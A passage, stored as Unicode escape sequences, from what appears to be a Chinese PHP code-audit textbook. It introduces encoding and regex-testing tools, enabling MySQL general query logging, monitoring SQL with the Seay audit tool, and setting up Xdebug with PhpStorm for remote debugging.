u5728XSS\u6F0F\u6D1E\u4E5F\u53EF\u5229\u7528\u4E0D\u540C\u7F16\u7801\u65B9\u5F0F\u7ED5\u8FC7\u8FC7\u6EE4\u51FD\u6570\u3002\r
\r
\u52A0\u89E3\u5BC6\u5DE5\u4F5C\u5728\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u65F6\u4E5F\u662F\u6D4B\u8BD5\u5DE5\u4F5C\u4E4B\u4E00\u3002\u56E0\u4E3A\u8003\u8651\u5230\u5B89\u5168\u95EE\u9898\uFF0C\u5F88\u591A\u7A0B\u5E8F\u5BF9\u5B57\u7B26\u4E32\u8FDB\u884C\u52A0\u5BC6\u4FDD\u62A4\uFF0C\u4F8B\u5982\uFF1A\u5C06\u7528\u6237\u767B\u5F55\u5BC6\u7801\u4E0Esalt\uFF08\u76D0\u503C\uFF09\u7EC4\u5408\u8FDB\u884Cmd5\u52A0\u5BC6\u3001\u5B57\u7B26\u4E32\u7ECF\u8FC7Hash\u7B97\u6CD5\u52A0\u5BC6\u4F5C\u4E3A\u7F51\u7AD9Cookie\u6216Session\u3002\u4E0B\u9762\u5BF9\u5E38\u7528\u7F16\u7801\u53CA\u52A0\u89E3\u5BC6\u5DE5\u5177\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
l \u7EBF\u4E0B\u7F16\u7801\u5DE5\u5177\r
\r
CaptfEncode V2\u5DE5\u5177\u652F\u6301\u591A\u79CD\u52A0\u89E3\u5BC6\u53CA\u7F16\u89E3\u7801\u65B9\u5F0F\uFF0C\u662F\u4E00\u6B3E\u65E2\u5C0F\u5DE7\u53C8\u529F\u80FD\u5F3A\u52B2\u7684\u7EBF\u4E0B\u7F16\u7801\u5DE5\u5177\uFF0C\u56FE1-38\u4E3ACaptfEncode V2\u754C\u9762\u56FE\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image080.gif)\r
\r
\u56FE1-38 CaptfEncoder V2\u754C\u9762\u56FE\r
\r
l \u5728\u7EBF\u7F16\u7801\u52A0\u89E3\u5BC6\u5DE5\u5177\r
\r
\u5F88\u591A\u7F51\u7AD9\u63D0\u4F9B\u4E86\u5728\u7EBF\u7F16\u7801\u53CA\u52A0\u89E3\u5BC6\u5DE5\u5177\uFF0C\u4E0B\u9762\u4ECB\u7ECD\u4E00\u6B3E\u5728\u7EBF\u7F51\u7AD9\u201CCTF\u5728\u7EBF\u5DE5\u5177\u201D\uFF0C\u5982\u56FE1-39\u6240\u793A\u3002\u5B83\u5177\u6709\u5E38\u7528\u7F16\u7801\u65B9\u5F0F\u53CA\u5BC6\u7801\u7B97\u6CD5\uFF0C\u7528\u6237\u5C06\u5B57\u7B26\u4E32\u590D\u5236\u5230\u6307\u5B9A\u7B97\u6CD5\u4E0B\u5373\u53EF\u8FDB\u884C\u52A0\u89E3\u5BC6\u53CA\u7F16\u7801\u6D4B\u8BD5\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image082.jpg)\r
\r
\u56FE1-39 \u5728\u7EBF\u52A0\u89E3\u5BC6\u5DE5\u5177\u56FE\r
\r
### 1.6.5     \u6B63\u5219\u8868\u8FBE\u5F0F\u6D4B\u8BD5\u5DE5\u5177\r
\r
\u6B63\u5219\u8868\u8FBE\u5F0F\u7684\u5E94\u7528\u573A\u666F\u5F88\u591A\uFF0C\u4F8B\u5982\uFF1A\u7528\u6237\u540D\u3001\u90AE\u7BB1\u3001\u624B\u673A\u53F7\u7B49\u683C\u5F0F\u7684\u8FC7\u6EE4\uFF0C\u535A\u5BA2\u8BBA\u575B\u641C\u7D22\u529F\u80FD\u7684\u8FC7\u6EE4\u7B49\u3002\u7F51\u7AD9\u5F00\u53D1\u9636\u6BB5\u901A\u5E38\u5BF9\u4F20\u9012\u7684\u53C2\u6570\u8FDB\u884C\u6B63\u5219\u8868\u8FBE\u5F0F\u8FC7\u6EE4\uFF0C\u5982\u679C\u7528\u6237\u8F93\u5165\u5185\u5BB9\u7B26\u5408\u6B63\u5219\u8868\u8FBE\u5F0F\u8981\u6C42\u5219\u5141\u8BB8\u6570\u636E\u4F20\u9012\uFF0C\u5426\u5219\u62D2\u7EDD\u3002\u7531\u4E8E\u6B63\u5219\u8868\u8FBE\u5F0F\u9700\u8981\u975E\u5E38\u4E25\u8C28\uFF0C\u5F00\u53D1\u8005\u901A\u5E38\u9700\u8981\u5BF9\u5404\u79CD\u60C5\u51B5\u7EFC\u5408\u8003\u8651\u3002\u4E0D\u4E25\u683C\u7684\u6B63\u5219\u8868\u8FBE\u5F0F\u5C06\u5BFC\u81F4\u5404\u79CD\u6F0F\u6D1E\u3002\u56E0\u6B64\uFF0C\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u68C0\u67E5\u6B63\u5219\u8868\u8FBE\u5F0F\u4E5F\u5C5E\u4E8E\u5DE5\u4F5C\u4E4B\u4E00\u3002\u5BA1\u8BA1\u4EBA\u5458\u5F80\u5F80\u6D4B\u8BD5\u5404\u79CD\u53EF\u7ED5\u8FC7\u6B63\u5219\u8868\u8FBE\u5F0F\u7684\u60C5\u51B5\uFF0C\u4E0B\u9762\u4ECB\u7ECD\u6B63\u5219\u8868\u8FBE\u5F0F\u8C03\u8BD5\u5DE5\u5177\u3002\r
\r
\u5F88\u591A\u7F51\u7AD9\u63D0\u4F9B\u6B63\u5219\u8868\u8FBE\u5F0F\u8C03\u8BD5\u529F\u80FD\uFF0C\u7528\u6237\u53EF\u5C06\u5F85\u6D4B\u8BD5\u6B63\u5219\u8868\u8FBE\u5F0F\u3001\u6D4B\u8BD5\u5B57\u7B26\u4E32\u7C98\u8D34\u8FDB\u7F51\u7AD9\u5373\u53EF\u8FDB\u884C\u7ED3\u679C\u5339\u914D\u6D4B\u8BD5\uFF0C\u5982\u56FE1-40\u6240\u793A\u3002\u6B64\u7C7B\u7F51\u7AD9\u9664\u5339\u914D\u6B63\u5219\u8868\u8FBE\u5F0F\u529F\u80FD\u5916\uFF0C\u8FD8\u5305\u62EC\uFF1A\u5E38\u7528\u9700\u6C42\u6B63\u5219\u8868\u8FBE\u5F0F\u67E5\u8BE2\u3001\u6839\u636E\u6B63\u5219\u8868\u8FBE\u5F0F\u751F\u6210\u5404\u79CD\u8BED\u8A00\u4EE3\u7801\u3001\u6587\u672C\u66FF\u6362\u3001\u6B63\u5219\u8868\u8FBE\u5F0F\u8BED\u6CD5\u53C2\u8003\u7B49\u529F\u80FD\u3002\u9664\u5728\u7EBF\u5DE5\u5177\u5916\uFF0C\u5728\u4EBA\u5DE5\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u5F88\u591A\u5B89\u5168\u4EBA\u5458\u4E5F\u4F7F\u7528\u52A8\u6001\u8C03\u8BD5\u529F\u80FD\u8FDB\u884C\u6B63\u5219\u8868\u8FBE\u5F0F\u5BA1\u8BA1\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image084.jpg)\r
\r
\u56FE1-40 \u6B63\u5219\u8C03\u8BD5\u5DE5\u5177\u56FE\r
\r
### 1.6.6 \u6570\u636E\u5E93\u6267\u884C\u76D1\u63A7\r
\r
\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4F7F\u7528SQL\u6CE8\u5165\u6267\u884C\u76D1\u63A7\u5DE5\u5177\u53EF\u4EE5\u534F\u52A9\u5BA1\u8BA1\u4EBA\u5458\u8C03\u8BD5\u8BE5\u6F0F\u6D1E\uFF0C\u672C\u5C0F\u8282\u5C06\u5BF9MySQL\u6570\u636E\u5E93\u7684\u76D1\u63A7\u5DE5\u5177\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
l MySQL\u76D1\u63A7\u914D\u7F6E\u4E0E\u67E5\u770B\r
\r
MySQL\u65E5\u5FD7\u5305\u62EC\uFF1A\u666E\u901A\u65E5\u5FD7\uFF08general Log\uFF09\u3001\u6162\u67E5\u8BE2\u65E5\u5FD7\uFF08slow Log\uFF09\u3001\u9519\u8BEF\u65E5\u5FD7\uFF08error Log\uFF09\u3002\u9ED8\u8BA4\u60C5\u51B5\u4E0B\uFF0CMySQL\u4E2D\u666E\u901A\u65E5\u5FD7\u662F\u5173\u95ED\u7684\uFF0C\u8FD9\u662F\u56E0\u4E3AMySQL\u4F1A\u4E0D\u65AD\u8BB0\u5F55\u65E5\u5FD7\u5E76\u5BF9\u7CFB\u7EDF\u4EA7\u751F\u5F00\u9500\u3002\u65E0\u8BBA\u67E5\u8BE2\u8BED\u53E5\u662F\u5426\u6B63\u786E\uFF0C\u666E\u901A\u65E5\u5FD7\u90FD\u5C06\u8BB0\u5F55\u6570\u636E\u5E93\u6BCF\u6B21\u6267\u884C\u64CD\u4F5C\u3002\r
\r
\u5BF9SQL\u8BED\u53E5\u8FDB\u884C\u76D1\u63A7\uFF0C\u9700\u8981\u4FEE\u6539Mysql\u5168\u5C40\u53D8\u91CF\u6765\u5F00\u542F\u666E\u901A\u65E5\u5FD7\u529F\u80FD\u3002\r
\r
  \u67E5\u770B\u666E\u901A\u65E5\u5FD7\u5F00\u542F\u60C5\u51B5\r
\r
\r
\r
show global variables like '%general%';\r
\r
\r
\r
\u6267\u884C\u7ED3\u679C\u59821-41\u6240\u793A\uFF0C\u82E5general_log\u503C\u4E3AOFF\uFF0C\u5219\u67E5\u8BE2\u65E5\u5FD7\u529F\u80FD\u5173\u95ED\uFF0C\u53CD\u4E4B\u5F00\u542F\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image086.jpg)\r
\r
\u56FE1-41 general_log\u5F00\u542F\u56FE\r
\r
  \u5F00\u542F\u67E5\u8BE2\u65E5\u5FD7\u547D\u4EE4\r
\r
\r
\r
set global general_log=on;\r
\r
\r
\r
  MySQL\u6267\u884C\u76D1\u63A7\u5305\u62EC\u4E24\u79CD\u8BB0\u5F55\u65B9\u5F0F\uFF1A\u5C06\u6267\u884C\u8BED\u53E5\u8BB0\u5F55\u5230\u6587\u4EF6\u4E2D\uFF1B\u5C06\u6267\u884C\u8BED\u53E5\u8BB0\u5F55\u5230\u6570\u636E\u5E93\u7684general_log\u8868\u4E2D\u3002\r
\r
\u67E5\u770B\u65E5\u5FD7\u4FDD\u5B58\u65B9\u5F0F\u7684\u547D\u4EE4\u3002\r
\r
\r
\r
show variables like 'log_output';\r
\r
\r
\r
\u6267\u884C\u7ED3\u679C\u59821-42\u6240\u793A\uFF0C\u82E5log_output\u503C\u4E3ATABLE\uFF0C\u5219\u8BF4\u660E\u65E5\u5FD7\u4FDD\u5B58\u4E8Egeneral_log\u8868\u4E2D\uFF0C\u53CD\u4E4B\u5219\u4FDD\u5B58\u4E8E\u65E5\u5FD7\u6587\u4EF6\u4E2D\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image088.jpg)\r
\r
\u56FE1-42 \u4FDD\u5B58\u4E8E\u65E5\u5FD7\u56FE\r
\r
  \u8BBE\u7F6E\u5C06\u65E5\u5FD7\u4FDD\u5B58\u4E8E\u6570\u636E\u5E93\u4E2D\u547D\u4EE4\r
\r
\r
\r
SET GLOBAL general_log=on;\r
\r
SET GLOBAL log_output='table';\r
\r
\r
\r
  \u8BBE\u7F6E\u5C06\u65E5\u5FD7\u4FDD\u5B58\u4E8E\u6587\u4EF6\u4E2D\u547D\u4EE4\r
\r
\r
\r
SET GLOBAL general_log=on;\r
\r
SET GLOBAL log_output='file';\r
\r
\r
\r
\u8FD9\u6837\u8BBE\u7F6E\u540E\u67E5\u8BE2\u8BB0\u5F55\u5C31\u4F1A\u4FDD\u5B58\u5728\u6587\u4EF6\u4E2D\uFF0C\u65E5\u5FD7\u6587\u4EF6\u7684\u4FDD\u5B58\u8DEF\u5F84\u53EF\u4EE5\u5728MySQL\u914D\u7F6E\u6587\u4EF6my.ini\u4E2D[mysqld]\u90E8\u5206\u52A0\u5165\u5982\u4E0B\u4EE3\u7801\u8FDB\u884C\u8BBE\u7F6E\uFF0C\u6700\u540E\u91CD\u542FMySQL\u6570\u636E\u5E93\u5373\u53EF\u3002\r
\r
\r
\r
general_log=ON\r
\r
general_log_file={\u65E5\u5FD7\u8DEF\u5F84}/query.log\r
\r
\r
\r
l Seay\u76D1\u63A7MySQL\u6267\u884C\u6848\u4F8B\r
\r
Seay\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u4E2D\u201C\u5BA1\u8BA1\u63D2\u4EF6\u201D->\u201Cmysql\u76D1\u63A71.0\u201D\u63D2\u4EF6\u53EF\u76D1\u63A7\u6570\u636E\u5E93\u6267\u884C\u60C5\u51B5\u3002\u7528\u6237\u53EF\u901A\u8FC7\u8F93\u5165\u76D1\u63A7\u4E3B\u673AIP\u3001\u6570\u636E\u5E93\u7528\u6237\u540D\u5BC6\u7801\u8FDE\u63A5\u6570\u636E\u5E93\u8FDB\u884C\u76D1\u63A7\uFF0C\u5982\u56FE1-43\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image090.jpg)\r
\r
\u56FE1-43 \u6570\u636E\u5E93\u6267\u884C\u76D1\u63A7\u56FE\r
\r
\u4EE574CMS\u767B\u5F55\u529F\u80FD\u4E3A\u4F8B\uFF0C\u76D1\u63A7\u6570\u636E\u5E93\u6267\u884C\u60C5\u51B5\u3002Seay\u7A97\u53E3\u70B9\u51FB\u201C\u4E0B\u65AD\u201D\u6309\u94AE\uFF0C\u5728CMS\u754C\u9762\u4F7F\u7528\u7528\u6237\u540D\u767B\u5F55\uFF0C\u8F93\u5165\u4EFB\u610F\u7528\u6237\u540D\u5BC6\u7801\u8FDB\u884C\u767B\u5F55\uFF0C\u5982\u56FE1-44\u6240\u793A\u3002\u5728Seay\u7A97\u53E3\u70B9\u51FB\u201C\u66F4\u65B0\u201D\u67E5\u770B\u767B\u5F55\u529F\u80FD\u6267\u884C\u7684SQL\u8BED\u53E5\u5217\u8868\uFF0C\u5982\u56FE1-45\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image092.jpg)\r
\r
\u56FE1-44 \u67D0\u5E73\u53F0\u767B\u5F55\u56FE\r
\r
![\u56FE\u72476](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image094.gif)\r
\r
\u56FE1-45 Seay\u6570\u636E\u5E93\u76D1\u63A7\u56FE\r
\r
## 1.7 \u4EE3\u7801\u5BA1\u8BA1\u52A8\u6001\u8C03\u8BD5\u73AF\u5883\u642D\u5EFA\r
\r
\u672C\u5C0F\u8282\u4ECB\u7ECDPHP\u4EE3\u7801\u52A8\u6001\u8C03\u8BD5\u7684\u73AF\u5883\u642D\u5EFA\u3002\u65E0\u8BBA\u662F\u6570\u636E\u6D41\u5206\u6790\u3001\u7A0B\u5E8F\u6D41\u7A0B\u5206\u6790\u3001\u6D4B\u8BD5EXP\u3001\u6570\u636E\u5E93\u6267\u884C\u76D1\u63A7\u90FD\u9700\u8981\u52A8\u6001\u8C03\u8BD5\u3002\u4E0E\u9759\u6001\u5BA1\u8BA1\u4EE3\u7801\u76F8\u6BD4\uFF0C\u52A8\u6001\u8C03\u8BD5\u66F4\u4E3A\u751F\u52A8\u76F4\u89C2\uFF0C\u4F7F\u7528IDE\u96C6\u6210\u5DE5\u5177\u52A8\u6001\u8C03\u8BD5\u4EE3\u7801\u662F\u5FC5\u5907\u6280\u80FD\u3002\r
\r
PHP\u52A8\u6001\u8C03\u8BD5\u73AF\u5883\u642D\u5EFA\u9700\u8981\u914D\u7F6E\u7684\u5185\u5BB9\u5305\u62EC\uFF1A\r
\r
l PHP\u6269\u5C55\u63D2\u4EF6Xdebug\u7684\u5B89\u88C5\u4E0E\u914D\u7F6E\uFF1B\r
\r
l \u6D4F\u89C8\u5668Xdebug helper\u63D2\u4EF6\u7684\u5B89\u88C5\uFF1B\r
\r
l PhpStorm\u96C6\u6210\u73AF\u5883\u914D\u7F6E\u8FDC\u7A0B\u8C03\u8BD5\u3002\r
\r
\u672C\u8282\u9996\u5148\u4ECB\u7ECDPHP\u52A8\u6001\u73AF\u5883\u8C03\u8BD5\u539F\u7406\uFF0C\u7136\u540E\u4ECB\u7ECDPHP\u52A8\u6001\u73AF\u5883\u642D\u5EFA\u3002\r
\r
### 1.7.1 \u52A8\u6001\u8C03\u8BD5\u539F\u7406\r
\r
\u5728\u672A\u914D\u7F6E\u52A8\u6001\u8C03\u8BD5\u73AF\u5883\u524D\u6D41\u7A0B\u56FE\u59821-46\u6240\u793A\u3002\u6D4F\u89C8\u5668\u89E6\u53D1HTTP\u8BF7\u6C42\uFF0CHTTP\u6570\u636E\u5305\u901A\u8FC7Apche\u4E2D\u95F4\u4EF6\u8F6C\u53D1\u81F3\u540E\u53F0PHP\u4EE3\u7801\u5904\u7406\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image096.jpg)\r
\r
\u56FE1-46 \u672A\u914D\u7F6E\u52A8\u6001\u8C03\u8BD5\u6D41\u7A0B\u56FE\r
\r
PHP\u52A8\u6001\u8C03\u8BD5\u73AF\u5883\u642D\u5EFA\u9700\u8981\u5305\u62EC\uFF1APHP\u3001Xdebug\u3001PhpStorm\u3002\u52A8\u6001\u8C03\u8BD5\u73AF\u5883\u540E\u6D41\u7A0B\u56FE\u59821-47\u6240\u793A\u3002\u8C03\u8BD5\u73AF\u5883\u5F00\u542F\u540E\u7531Xdebug\u8D1F\u8D23\uFF0CPHP\u4EE3\u7801\u8C03\u8BD5\u6D41\u7A0B\u8F6C\u53D1\u81F3PhpStorm\u3002\r
\r
l \u9996\u5148\u4F7F\u7528\u6D4F\u89C8\u5668\u89E6\u53D1HTTP\u8BF7\u6C42\uFF0C\u6B63\u5E38\u4E1A\u52A1\u6570\u636E\u6D41\u4E0E\u672A\u8C03\u8BD5\u73AF\u5883\u76F8\u540C\u3002\r
\r
l PhpStorm\u5F00\u542F9000\u7AEF\u53E3\u76D1\u542C\uFF0CXdebug\u63A5\u6536PHP\u7684\u6B63\u5E38\u4E1A\u52A1\u6D41\u7A0B\u8F6C\u53D1\u81F3\u96C6\u6210\u73AF\u5883PhpStorm\u3002\r
\r
l PhpStorm\u4E0E\u670D\u52A1\u5668PHP\u4E2D\u7684\u4EE3\u7801\u8FDB\u884C\u540C\u6B65\u534F\u8C03\u63A7\u5236\uFF0C\u4ECE\u800C\u52A8\u6001\u8C03\u8BD5PHP\u4EE3\u7801\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image098.jpg)\r
\r
\u56FE1-47 \u52A8\u6001\u8C03\u8BD5\u6D41\u7A0B\u56FE\r
\r
### 1.7.2  Xdebug\u5B89\u88C5\u4E0E\u914D\u7F6E\r
\r
\u4F7F\u7528\u96C6\u6210IDE\u8FDB\u884C\u52A8\u6001\u8C03\u8BD5\u7684\u5FC5\u5907\u6761\u4EF6\u662F\u4E3APHP\u914D\u7F6EXdebug\u3002Xdebug\u662FPHP\u8BED\u8A00\u4E2D\u7684\u6269\u5C55\uFF0C\u5B83\u662F\u4E00\u4E2A\u5F00\u6E90\u7684PHP\u7A0B\u5E8F\u8C03\u8BD5\u5668\u3002Xdebug\u652F\u6301Linux\u3001MacOS\u3001Windows\u7CFB\u7EDF\uFF0C\u672C\u8282\u5C06\u4EE5Windows\u4E3A\u73AF\u5883\u4ECB\u7ECDXdebug\u914D\u7F6E\u65B9\u6CD5\u3002\r
\r
Xdebug\u7684\u4E3B\u8981\u529F\u80FD\u5305\u62EC\uFF1A\r
\r
l IDE\u7684\u5355\u6B65\u8C03\u8BD5\u5668\uFF0C\u53EF\u4EE5\u7528\u6765\u8DDF\u8E2A\u3001\u8C03\u8BD5\u3001\u5206\u6790PHP\u7A0B\u5E8F\u7684\u8FD0\u884C\u72B6\u51B5\uFF1B\r
\r
l \u8BB0\u5F55\u51FD\u6570\u7684\u8C03\u7528\u548C\u5411\u78C1\u76D8\u5206\u914D\u53D8\u91CF\u7684\u529F\u80FD\u3002 \r
\r
Xdebug\u7684\u5B89\u88C5\u914D\u7F6E\u6D41\u7A0B\u5982\u56FE1-48\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image100.jpg)\r
\r
\u56FE1-48 Xdebug\u5B89\u88C5\u914D\u7F6E\u6D41\u7A0B\u56FE\r
\r
1\u3001\u4E0B\u8F7DXdebug\r
\r
\u7531\u4E8EPHP\u9ED8\u8BA4\u672A\u5B89\u88C5Xdebug\u63D2\u4EF6\uFF0C\u56E0\u6B64\u9700\u4ECEXdebug\u5B98\u7F51\u4E0B\u8F7D\uFF0C\u56FE1-49\u4E3A\u4E0B\u8F7D\u754C\u9762\u3002\u6CE8\u610F\uFF1A\u4E0B\u8F7D\u7684Xdebug\u7248\u672C\u8981\u4E0E\u672C\u673A\u5B89\u88C5\u7684PHP\u73AF\u5883\u7248\u672C\u76F8\u5339\u914D\uFF0C\u5426\u5219\u53EF\u80FD\u51FA\u73B0\u65E0\u6CD5\u8C03\u8BD5\u7684\u60C5\u51B5\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image102.jpg)\r
\r
\u56FE1-49 Xdebug\u4E0B\u8F7D\u754C\u9762\r
\r
2\u3001\u5B89\u88C5Xdebug\r
\r
Windows\u7CFB\u7EDF\u4E2D\u9700\u5C06\u4E0B\u8F7D\u7684dll\u6587\u4EF6\u62F7\u8D1D\u81F3\u672C\u673APHP\u73AF\u5883\u7684ext\u76EE\u5F55\u4E0B\u3002\u82E5\u4F7F\u7528PhpStudy\u96C6\u6210\u73AF\u5883\uFF0C\u5219\u9700\u5728\u96C6\u6210\u73AF\u5883\u4E2D\u5F00\u542FXdebug\u3002\r
\r
3\u3001\u914D\u7F6EPHP\r
\r
\u5728PHP\u914D\u7F6E\u6587\u4EF6php.ini\u4E2D\u589E\u52A0Xdebug\u914D\u7F6E\uFF0C\u6DFB\u52A0\u5185\u5BB9\u5982\u4E0B\uFF1A\r
\r
\r
\r
[XDebug]\r
\r
zend_extension="D:\\Program Files\\phpStudy\\PHPTutorial\\php\\php-5.4.45\\ext\\php_xdebug.dll"             //xdebug\u67E5\u770B\u4F4D\u7F6E\r
\r
xdebug.idekey=PHPSTORM             //\u8FDE\u63A5\u79D8\u94A5\r
\r
xdebug.remote_enable=on             //\u662F\u5426\u5F00\u542F\u8FDC\u7A0B\u8C03\u8BD5\r
\r
xdebug.remote_host=localhost          //\u8FDC\u7A0B\u8FDE\u63A5IP\r
\r
xdebug.remote_port=9000             //\u8C03\u8BD5\u7AEF\u53E3\r
\r
xdebug.remote_handler=dbgp             //\u8FDE\u63A5\u534F\u8BAE\r
\r
xdebug.auto_trace=on\r
\r
\r
\r
\u6DFB\u52A0\u6210\u529F\u540E\u91CD\u542FApache\u670D\u52A1\uFF0C\u7F51\u7AD9\u6839\u8DEF\u5F84\u4E0B\u7F16\u51991.php\u5185\u5BB9\u4E3A<?php phpinfo();?>\u3002\u8BBF\u95EE\u8BE5\u7F51\u9875\u65F6\u82E5\u53D1\u73B0Xdebug\uFF0C\u5219\u8BF4\u660E\u5B89\u88C5\u914D\u7F6E\u6210\u529F\uFF0C\u5982\u56FE1-50\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image104.jpg)\r
\r
\u56FE1-50 Xdebug\u4FE1\u606F\u56FE\r
\r
### 1.7.3 \u6D4F\u89C8\u5668Xdebug helper\u5B89\u88C5\r
\r
  \u914D\u7F6E\u6210\u529FXdebug\u540E\uFF0C\u4E3A\u6D4F\u89C8\u5668\u5B89\u88C5\u6269\u5C55\u63D2\u4EF6Xdebug helper\uFF0C\u5728\u6D4F\u89C8\u5668\u70B9\u51FB\u201C\u8BBE\u7F6E\u201D->\u6DFB\u52A0\u7EC4\u4EF6->\u641C\u7D22Xdebug helper\u5B89\u88C5\u63D2\u4EF6\uFF0C\u5982\u56FE1-51\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image106.jpg)\r
\r
\u56FE1-51 Xdebug helper\u63D2\u4EF6\u56FE\r
\r
\u5B89\u88C5\u540E\u6D4F\u89C8\u5668url\u53F3\u4FA7\u5C06\u51FA\u73B0\u201C\u6606\u866B\u201D\u56FE\u6807\uFF0C\u70B9\u51FB\u6606\u866B\u4E2D\u201CDebug\u201D\u9009\u9879\uFF0C\u5F00\u542F\u6D4F\u89C8\u5668\u8C03\u8BD5\uFF0C\u5982\u56FE1-52\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image108.jpg)\r
\r
\u56FE1-52 Xdebug\u5F00\u542F\u56FE\r
\r
### 1.7.4 PhpStorm\u914D\u7F6E\u8FDC\u7A0B\u8C03\u8BD5\r
\r
1\u3001\u9009\u62E9\u6307\u5B9A\u7684PHP\u7248\u672C\r
\r
\u672C\u8282\u4F7F\u7528PhpStudy\u542F\u52A8\u4E14PHP\u7248\u672C\u4E3A5.4\u3002\u56E0\u6B64\uFF0C\u9700\u8981\u4E3APhpStorm\u914D\u7F6E\u4E0E\u4E4B\u5339\u914D\u7684PHP\u73AF\u5883\uFF0C\u70B9\u51FBFile->Setting->languages&Framework->PHP->\u9009\u5B9A\u7248\u672C\uFF0C\u914D\u7F6E\u65B9\u6CD5\u5982\u56FE1-53\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image110.jpg)\r
\r
\u56FE1-53 \u9009\u5B9APHP\u7248\u672C\u56FE\r
\r
2\u3001\u914D\u7F6EDebug\u8C03\u8BD5\u5668\u7AEF\u53E3\r
\r
\u70B9\u51FBFile->Setting->languages&Framework->PHP->Debug\u914D\u7F6E\u8C03\u8BD5\u5668\u7AEF\u53E3\uFF0C\u8BE5\u8C03\u8BD5\u5668\u914D\u7F6E\u5E94\u4E0EPhp.ini\u4E2D\u7684\u914D\u7F6E\u6587\u4EF6\u5185\u5BB9\u5339\u914D\uFF0C\u5982\u56FE1-54\u6240\u793A\u3002\r
\r
Xdebug\u53C2\u6570\u8BF4\u660E\uFF1A\r
\r
l zend_extension\uFF1A\u52A0\u8F7DXdebug\u6A21\u5757\u3002 \r
\r
l Xdebug.auto_trace\uFF1A\u81EA\u52A8\u6253\u5F00\u201C\u76D1\u6D4B\u51FD\u6570\u8C03\u7528\u8FC7\u7A0B\u201D\u529F\u80FD\u3002 \r
\r
l Xdebug.remote_enable\uFF1A\u63A7\u5236Xdebug\u662F\u5426\u5E94\u8BE5\u8FDE\u63A5\u4E00\u4E2A\u6309\u7167Xdebug.remote_host\u548CXdebug.remote_port\u6765\u76D1\u542C\u4E3B\u673A\u548C\u7AEF\u53E3\u7684debug\u5BA2\u6237\u7AEF\u3002\r
\r
l Xdebug.remote_host\uFF1Adebug\u5BA2\u6237\u7AEF\u6B63\u5728\u8FD0\u884C\u7684\u4E3B\u673A\u3002\r
\r
l Xdebug.port\uFF1Adebug\u8FDE\u63A5\u8FDC\u7A0B\u4E3B\u673A\u7684\u7AEF\u53E3\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image112.jpg)\r
\r
\u56FE1-54 \u8C03\u8BD5\u7AEF\u53E3\u914D\u7F6E\u56FE\r
\r
3\u3001\u914D\u7F6E\u8C03\u8BD5\u4EE3\u7406\r
\r
\u70B9\u51FBFile->Setting->languages&Framework->PHP->Debug->DBGP Proxy\u914D\u7F6E\u8C03\u8BD5\u4EE3\u7406\uFF0C\u8BE5\u8C03\u8BD5\u5668\u914D\u7F6E\u4E5F\u5E94\u4E0EPhp.ini\u4E2D\u7684\u914D\u7F6E\u6587\u4EF6\u5185\u5BB9\u5339\u914D\u3002\u6CE8\u610F\uFF1Alocalhost\u4E0E127.0.0.1\u90FD\u8868\u793A\u672C\u673A\u670D\u52A1\u5668\uFF0C\u5982\u56FE1-55\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image114.jpg)\r
\r
\u56FE1-55 \u8C03\u8BD5\u4EE3\u7406\u8BBE\u7F6E\u56FE\r
\r
4\u3001\u914D\u7F6E\u670D\u52A1\u5668\u4E0E\u76EE\u5F55\u5BF9\u5E94\r
\r
\u70B9\u51FBFile->Setting->languages&Framework->PHP->Servers\u914D\u7F6E\u9884\u8C03\u8BD5\u670D\u52A1\u5668\uFF0C\u5982\u56FE1-56\u6240\u793A\u3002\r
\r
l \u9996\u5148\u70B9\u51FB\u201C+\u201D\u6DFB\u52A0\u9884\u8C03\u8BD5\u670D\u52A1\u5668\uFF0C\u4E3A\u8BE5Server\u547D\u540D\uFF1B\r
\r
l \u5728Host\u4E2D\u8F93\u5165\u9884\u8C03\u8BD5\u670D\u52A1\u5668IP\u5730\u5740\uFF0CHTTP\u670D\u52A1\u7AEF\u53E3\u4E3A80\uFF0C\u5E76\u9009\u62E9\u8C03\u8BD5\u5668\uFF1B\r
\r
